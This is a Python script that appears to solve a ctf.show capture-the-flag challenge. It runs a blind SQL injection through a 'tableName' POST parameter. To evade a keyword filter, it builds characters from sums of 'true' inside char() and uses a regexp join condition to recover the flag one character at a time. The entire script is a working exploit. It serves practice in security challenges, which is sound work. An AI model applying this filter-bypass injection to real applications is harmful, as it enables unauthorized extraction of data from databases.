import string

import requests


url = "http://b3c027af-65f0-4fb7-9b0b-38c1c99b277e.challenge.ctf.show/select-waf.php"
payload = "ctfshow_user as a right join ctfshow_user as b on b.pass regexp(char({}))"
true_flag = "$user_count = 43;"


def convert(num: int) -> str:
    return '+'.join("true" for _ in range(num))


def make_payload(has: str) -> str:
    return payload.format(','.join([convert(ord(x)) for x in has]))


def valid_payload(p: str) -> bool:
    data = {
        "tableName": p
    }
    response = requests.post(url, data=data)
    return true_flag in response.text


flag = "ctf" # 这里注意表中用 regexp('ctf') 只有一个结果，要提前给出这一小段 flag 头避免其他记录干扰匹配
while True:
    for c in "{}-" + string.digits + string.ascii_lowercase:
        pd = flag+c
        print(f"\r[*] trying {pd}", end="")
        if valid_payload(make_payload(pd)):
            flag += c
            print(f"\r[*] flag: {flag}")
            break
    if flag[-1] == "}":
        break